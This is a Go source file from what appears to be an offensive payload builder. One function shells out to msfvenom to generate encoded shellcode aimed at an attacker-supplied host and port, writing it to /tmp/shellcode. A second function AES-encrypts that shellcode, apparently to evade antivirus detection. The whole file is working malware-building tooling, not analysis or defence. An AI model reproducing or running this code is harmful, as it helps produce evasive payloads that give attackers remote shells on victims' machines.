package shellcode

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"os/exec"
)

func CreateShellcode(listerner, lhost, lport, i string) {
	fmt.Println("[+] Create shelcode with msfvenom")
	msfvenom := "msfvenom -p " + listerner + " lhost=" + lhost + " lport=" + lport + " -e x86/shikata_ga_nai " + "-i " + i + " -f hex > /tmp/shellcode"
	fmt.Println("[+] msfvenom command :", msfvenom)
	cmd := exec.Command("/bin/bash", "-c", msfvenom)
	cmd.Stdin = os.Stdin
	// cmd.Stdout = os.Stdout
	// cmd.Stderr = os.Stderr
	fmt.Println("[+] Creating shellcode into /tmp/shellcode ... ")
	cmd.Run()
	fmt.Println("[+] Shellcode Created !!!")
}

func Encrypt(key []byte, text []byte) ([]byte, error) {

	// Init Cipher
	fmt.Println("[+] Encrypting shellcode  ..")
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// Padding
	paddingLen := aes.BlockSize - (len(text) % aes.BlockSize)
	paddingText := bytes.Repeat([]byte{byte(paddingLen)}, paddingLen)
	textWithPadding := append(text, paddingText...)

	// Getting an IV
	ciphertext := make([]byte, aes.BlockSize+len(textWithPadding))
	iv := ciphertext[:aes.BlockSize]

	// Randomness
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	// Actual encryption
	cfbEncrypter := cipher.NewCFBEncrypter(block, iv)
	cfbEncrypter.XORKeyStream(ciphertext[aes.BlockSize:], textWithPadding)

	return ciphertext, nil

}
